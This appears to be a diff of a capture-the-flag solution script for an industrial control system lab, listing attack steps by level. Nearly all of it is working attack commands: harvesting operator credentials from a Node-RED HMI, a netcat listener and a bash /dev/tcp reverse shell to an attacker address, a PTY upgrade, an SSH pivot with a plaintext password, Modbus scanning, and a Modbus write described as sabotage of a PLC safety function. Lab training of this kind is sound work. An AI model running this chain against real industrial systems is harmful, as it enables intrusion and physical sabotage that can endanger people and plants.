@@ -22,32 +22,35 @@ ssh -o StrictHostKeyChecking=no debian@192.168.99.10 "sudo cat /root/flag2.txt"
 # Level 1: Foothold Passkey
 start
 
-# Level 2: Node-RED HMI Command (cat HMI flag)
+# Level 2: Attacker Terminal (Kali) - Scan operations subnet for SCADA HMI
+nmap -p 1880 --open 192.168.100.0/24
+
+# Level 3: Node-RED HMI Command (cat HMI flag)
 cat /root/flag.txt
 
-# Level 2: Node-RED HMI Command (Cat operator SSH credentials)
+# Level 4: Node-RED HMI Command (Cat operator SSH credentials)
 cat /home/debian/ews_credentials.txt
 
-# Level 3: Attacker Terminal (Kali) - Tab 1 (Start listener)
+# Level 5: Attacker Terminal (Kali) - Tab 1 (Start listener)
 nc -nlvp 4444
 
-# Level 3: Node-RED HMI Command (Trigger reverse shell to Attacker 10.10.10.50:4444)
+# Level 5: Node-RED HMI Command (Trigger reverse shell to Attacker 10.10.10.50:4444)
 bash -c 'bash -i >& /dev/tcp/10.10.10.50/4444 0>&1'
 
-# Level 3: Caught Netcat Shell (Run immediately on Kali to upgrade PTY)
+# Level 5: Caught Netcat Shell (Run immediately on Kali to upgrade PTY)
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 
-# Level 3: Upgraded Shell (SSH pivot from HMI to EWS)
+# Level 5: Upgraded Shell (SSH pivot from HMI to EWS)
 ssh operator@192.168.20.20
 
-# Level 3: EWS Password (Type/Paste into SSH prompt)
+# Level 5: EWS Password (Type/Paste into SSH prompt)
 operator123
 
-# Level 3: pivoted EWS Shell (Scan Control network for Modbus devices)
+# Level 5: pivoted EWS Shell (Scan Control network for Modbus devices)
 nmap -p 502 --open 192.168.20.0/24
 
-# Level 4: pivoted EWS Shell (Execute Modbus sabotage to PLC 192.168.20.10:502)
+# Level 6: pivoted EWS Shell (Execute Modbus sabotage to PLC 192.168.20.10:502)
 modbus 192.168.20.10 0=0
 
-# Level 4: Pivoted EWS Shell (Display final safety override flag)
+# Level 6: Pivoted EWS Shell (Display final safety override flag)
 cat /var/log/safety_override.txt
